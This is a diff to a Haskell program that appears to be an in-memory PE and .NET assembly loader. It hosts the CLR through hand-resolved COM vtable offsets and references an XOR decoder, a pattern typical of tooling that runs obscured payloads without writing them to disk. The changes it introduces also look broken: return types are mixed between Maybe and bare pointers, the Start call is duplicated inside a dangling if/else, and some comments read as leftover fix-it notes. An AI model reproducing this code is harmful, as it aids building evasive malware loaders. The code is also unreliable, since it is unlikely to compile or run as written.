@@ -431,14 +431,15 @@ pAddRef ptr = peek (castPtr ptr `plusPtr` (1 * sizeOf (undefined :: FunPtr ())))
 pRelease :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO ULONG))
 pRelease ptr = peek (castPtr ptr `plusPtr` (2 * sizeOf (undefined :: FunPtr ())))
 
-pStart :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO HRESULT))
-pStart ptr = peek (castPtr ptr `plusPtr` (3 * sizeOf (undefined :: FunPtr ())))
+-- Use castPtr to tell peekElemOff it is looking at an array of FunPtrs
+pStart :: Ptr (Ptr ()) -> IO (FunPtr (Ptr () -> IO HRESULT))
+pStart vtable = peekElemOff (castPtr vtable) 3
+
+pGetDefaultDomain :: Ptr (Ptr ()) -> IO (FunPtr (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT))
+pGetDefaultDomain vtable = peekElemOff (castPtr vtable) 13
 
 pStop :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO HRESULT))
 pStop ptr = peek (castPtr ptr `plusPtr` (4 * sizeOf (undefined :: FunPtr ())))
-
-pGetDefaultDomain :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT))
-pGetDefaultDomain ptr = peek (castPtr ptr `plusPtr` (13 * sizeOf (undefined :: FunPtr ())))
 
 -- AppDomain GUID
 iid_AppDomain :: GUID
@@ -544,66 +545,59 @@ xorDecode key target = BS.pack $ zipWith xor (BS.unpack target) (cycle (BS.unpac
 -- HELPER FUNCTIONS
 -- ============================================
 
--- | Helper to get ICLRRuntimeHost either via .NET 4 API or legacy COM
 getCLRRuntimeHost :: IO (Ptr ICLRRuntimeHost)
-getCLRRuntimeHost = alloca $ \ppv -> do
-  -- Try .NET 4 path (CLRCreateInstance)
+getCLRRuntimeHost = alloca $ \ppvHost -> do
   putStrLn "[*] Trying CLRCreateInstance (v4.0)..."
   hFlush stdout
-  resultV4 <- tryV4 ppv
-  case resultV4 of
-    Just ptr -> return ptr
-    Nothing -> do
-      -- Fallback to .NET 2 path (CoCreateInstance)
-      putStrLn "[!] CLR v4 load failed. Falling back to CoCreateInstance (v2.0)..."
-      hFlush stdout
+  
+  -- Step 1: Get MetaHost
+  alloca $ \ppvMeta -> do
+    hrMeta <- with clsid_CLRMetaHost $ \clsid -> 
+                with iid_ICLRMetaHost $ \iid -> 
+                  c_CLRCreateInstance clsid iid ppvMeta
+    
+    if hrMeta < 0 then fallbackLegacy ppvHost else do
+      pMetaRaw <- peek ppvMeta
+      vtableMetaPtr <- peek (castPtr pMetaRaw) :: IO (Ptr (Ptr ()))
       
-      -- CoInit is handled in caller, assuming COM is init
-      -- [FIX]: Use clsid_CorRuntimeHost (the shim) instead of clsid_CLRRuntimeHost
-      with clsid_CorRuntimeHost $ \pClsid ->
-        with iid_ICLRRuntimeHost $ \pIid -> do
-          hr' <- c_CoCreateInstance pClsid nullPtr 1 pIid ppv
-          when (hr' < 0) $ do
-             err <- c_GetLastError
-             error $ "Legacy CLR load failed: " ++ show hr' ++ " (Error: " ++ show err ++ ")"
+      -- Step 2: Get RuntimeInfo
+      alloca $ \ppvInfo -> do
+        pGetRuntimeFunc <- pGetRuntime (castPtr vtableMetaPtr)
+        -- Try a generic v4 string if specific version fails
+        verStr <- newCWString "v4.0.30319" 
+        hrRuntime <- with iid_ICLRRuntimeInfo $ \iid -> 
+           (unsafeCoerce mkMHGetRuntime) pGetRuntimeFunc pMetaRaw (castPtr verStr) iid ppvInfo
+        free verStr
+
+        if hrRuntime < 0 then fallbackLegacy ppvHost else do
+          pInfoRaw <- peek ppvInfo
+          vtableInfoPtr <- peek (castPtr pInfoRaw) :: IO (Ptr (Ptr ()))
+          pGetInterfaceFunc <- pGetInterface (castPtr vtableInfoPtr)
           
-          rawPtr <- peek ppv
-          return (castPtr rawPtr)
+          -- Step 3: Get the actual Host
+          -- Using the "Double IID" trick to bypass registration issues
+          hrHost <- with iid_ICLRRuntimeHost $ \rclsid -> 
+                      with iid_ICLRRuntimeHost $ \riid ->
+                         (unsafeCoerce mkRIGetInterface) pGetInterfaceFunc pInfoRaw rclsid riid ppvHost
+
+          -- Ensure getCLRRuntimeHost looks like this at the end of the V4 path:
+          if hrHost < 0 
+            then return Nothing 
+            else do
+              hostPtr <- peek ppvHost -- Dereference the allocated pointer
+              putStrLn "[+] Successfully bound to ICLRRuntimeHost v4"
+              return (Just (castPtr hostPtr)) -- Return the ACTUAL address
 
   where
-    tryV4 :: Ptr (Ptr IUnknown) -> IO (Maybe (Ptr ICLRRuntimeHost))
-    tryV4 ppvHost = alloca $ \ppvMeta -> do
-      hr <- with clsid_CLRMetaHost $ \clsid -> 
-              with iid_ICLRMetaHost $ \iid -> 
-                c_CLRCreateInstance clsid iid ppvMeta
-      
-      if hr < 0 then return Nothing else do
-        pMetaRaw <- peek ppvMeta
-        vtableMetaPtr <- peek (castPtr pMetaRaw) :: IO (Ptr (Ptr ()))
-        
-        alloca $ \ppvInfo -> do
-          pGetRuntimeFunc <- pGetRuntime (castPtr vtableMetaPtr)
-          verStr <- newCWString "v4.0.30319"
-          -- We use unsafeCoerce here to satisfy the compiler's type check
-          hrRuntime <- with iid_ICLRRuntimeInfo $ \iid -> 
-             (unsafeCoerce mkMHGetRuntime) pGetRuntimeFunc pMetaRaw (castPtr verStr) iid ppvInfo
-          free verStr
+    fallbackLegacy ppv = do
+      putStrLn "[!] v4 path failed, attempting v2.0 legacy fallback..."
+      with clsid_CorRuntimeHost $ \pClsid ->
+        with iid_ICLRRuntimeHost $ \pIid -> do
+          hr <- c_CoCreateInstance pClsid nullPtr 1 pIid ppv
+          if hr < 0 
+            then error $ "[-] CLR Load Critical Failure: 0x" ++ showHex (fromIntegral hr :: Word32) ""
+            else peek ppv >>= return . castPtr
 
-          if hrRuntime < 0 then return Nothing else do
-            pInfoRaw <- peek ppvInfo
-            vtableInfoPtr <- peek (castPtr pInfoRaw) :: IO (Ptr (Ptr ()))
-            
-            pGetInterfaceFunc <- pGetInterface (castPtr vtableInfoPtr)
-            
-            -- [THE FIX]: unsafeCoerce forces mkRIGetInterface to accept the pointer
-            -- and we pass iid_ICLRRuntimeHost twice to fix the "Class Not Registered" error.
-            hrHost <- with iid_ICLRRuntimeHost $ \rclsid -> 
-                        with iid_ICLRRuntimeHost $ \riid ->
-                           (unsafeCoerce mkRIGetInterface) pGetInterfaceFunc pInfoRaw rclsid riid ppvHost
-
-            if hrHost < 0 then return Nothing else do
-              hostPtr <- peek ppvHost
-              return (Just (castPtr hostPtr))
 getDataDirectory :: Ptr ImageNtHeaders64 -> Int -> IO (Ptr ImageDataDirectory)
 getDataDirectory ntPtr index = do
   let optHeaderPtr = plusPtr ntPtr 24
@@ -888,27 +882,35 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
       putStrLn "[*] COM initialized."
       hFlush stdout
 
+      -- [FIXED]: Ensure the object pointer itself isn't null before peeking the VTable
       pRuntimeHostRaw <- getCLRRuntimeHost
-      let runtimeHostRaw = castPtr pRuntimeHostRaw
-      
-      putStrLn "[*] ICLRRuntimeHost instance created."
-      hFlush stdout
 
-      -- [FIXED]: Dereference to get the actual VTable address for x64
+      let runtimeHostRaw = castPtr pRuntimeHostRaw
       vtablePtr <- peek (castPtr runtimeHostRaw) :: IO (Ptr (Ptr ()))
-      
+
+      -- Verify VTable isn't null before calling Start
+      if vtablePtr == nullPtr
+        then error "[-] VTable dereference failed!"
+        else do
+          pStartFuncPtr <- pStart (castPtr vtablePtr)
+          hrStart <- mkCLRStart pStartFuncPtr runtimeHostRaw      
+
       pStartFuncPtr <- pStart (castPtr vtablePtr)
       if pStartFuncPtr == nullFunPtr
         then error "[-] Critical Error: pStartFuncPtr is NULL. VTable offset is wrong for x64."
         else putStrLn $ "[*] Start function pointer located."
 
       hrStart <- mkCLRStart pStartFuncPtr runtimeHostRaw
+      
       if hrStart < 0 
         then do
           err <- c_GetLastError
           error $ "ICLRRuntimeHost::Start failed: " ++ show hrStart
-        else putStrLn "[*] CLR started successfully."
+        else do
+          putStrLn "[*] CLR started successfully."
+          hFlush stdout
 
+      -- This 'alloca' block is technically its own 'do' sequence
       alloca $ \ppvDomain -> do
         pGetDefaultDomainFuncPtr <- pGetDefaultDomain (castPtr vtablePtr)
         hrGetDomain <- mkCLRGetDefaultDomain pGetDefaultDomainFuncPtr runtimeHostRaw ppvDomain
@@ -918,7 +920,6 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
         pAppDomainIUnknown <- peek ppvDomain
         let appDomainRaw = castPtr pAppDomainIUnknown
         
-        -- [FIXED]: Dereference AppDomain VTable
         domainVtablePtr <- peek (castPtr appDomainRaw) :: IO (Ptr (Ptr ()))
 
         appBasePath <- newCWString "C:\\"
@@ -937,8 +938,11 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
 
         pRelease_ADFuncPtr <- pRelease_AD (castPtr domainVtablePtr)
         _ <- mkADRelease pRelease_ADFuncPtr (castPtr appDomainRaw)
-        putStrLn "[*] AppDomain released."
+        
+        -- ENSURE THIS BLOCK ENDS WITH AN EXPRESSION
+        return () 
 
+      -- Final cleanup for the CLR Host
       pStopFuncPtr <- pStop (castPtr vtablePtr)
       _ <- mkCLRStop pStopFuncPtr runtimeHostRaw
       
@@ -947,6 +951,7 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
 
       c_CoUninitialize
       putStrLn "[*] COM uninitialized."
+      -- THE LAST STATEMENT OF THE ENTIRE 'THEN' BLOCK
       return ()
       else do
       optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
